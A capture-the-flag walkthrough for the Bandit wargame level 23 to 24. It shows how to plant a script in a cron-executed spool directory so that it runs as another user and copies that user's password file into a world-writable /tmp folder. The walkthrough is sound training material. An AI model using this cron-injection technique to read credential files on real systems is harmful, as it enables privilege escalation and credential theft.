# Bandit Level 23 -> 24

## Goal

Create a script that will be executed by bandit24's cron job.

## Key Concept

Writing scripts to be executed by other users.

## Solution

Examine the cron job:

```bash
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
```

Create a working directory:

```bash
mkdir -p /tmp/mydir
chmod 777 /tmp/mydir
```

Create a script to capture the password:

```bash
cat > /var/spool/bandit24/foo/getpass.sh << 'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/mydir/pass.txt
EOF
chmod 755 /var/spool/bandit24/foo/getpass.sh
```

Wait for the cron job to execute (runs every minute), then:

```bash
cat /tmp/mydir/pass.txt
```

## Why This Works

The cron job executes scripts placed in a specific directory as bandit24. Our script reads bandit24's password and writes it to a location we can access.
